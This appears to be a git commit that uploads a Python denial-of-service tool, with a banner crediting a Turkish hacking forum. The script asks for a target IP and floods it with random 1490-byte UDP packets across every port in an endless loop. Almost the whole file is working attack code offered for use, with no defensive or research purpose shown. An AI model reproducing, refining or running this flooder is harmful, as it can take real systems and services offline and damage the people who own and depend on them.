4cb484fa8dd050583cbdfcce80a3e8ae6e57537e
suskun12 <49838220+suskun12@users.noreply.github.com>
2020-09-11 12:02:56 +0300

    Add files via upload

---
+++ ANTI-SOSYAL~DoS~.py
@@ -0,0 +1,40 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+import os
+import time
+import socket
+import random
+os.system("clear")
+os.system("figlet")
+print("~#~; Program turkhackteam.org ve hack sevenler ailesi icin hazirlanmistir.")
+time.sleep(5)
+os.system("cls")
+os.system("figlet")
+print("""               dp
+
+ 	    dbPYB       dp   dp"dp     dpPYb   dpdpdp
+ 	    dp          dp   dp   dp   dp      dp   dp
+ 	    dPYd        dp   dp    dp  dpPYb   dpdpdp
+ 	    dp          dp   dp    dp  dp      dp  dp
+            dbdpd   pdpdp    YbodPdp   YbodP   sp   dp. (HACKER-EJDER)
+   -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-                                            
+                       $EJDER_HACKER                                             
+	""")
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP
+bytes = random._urandom(1490)
+ip = input("<< Saldirilacak sistemin ip adresini giriniz >> ~# ")
+os.system("clear")
+sent = 0
+port = 1
+while True:
+	try:
+		if port == 65535:
+			port = 1
+		sock.sendto(bytes,(ip,port))
+		sent = sent + 1
+		port = port + 1
+		os.system("clear")
+		print("%s Paketler hedefe gonderiliyor."%sent)
+			
+	except KeyboardInterrupt:
+		os.system("exit")
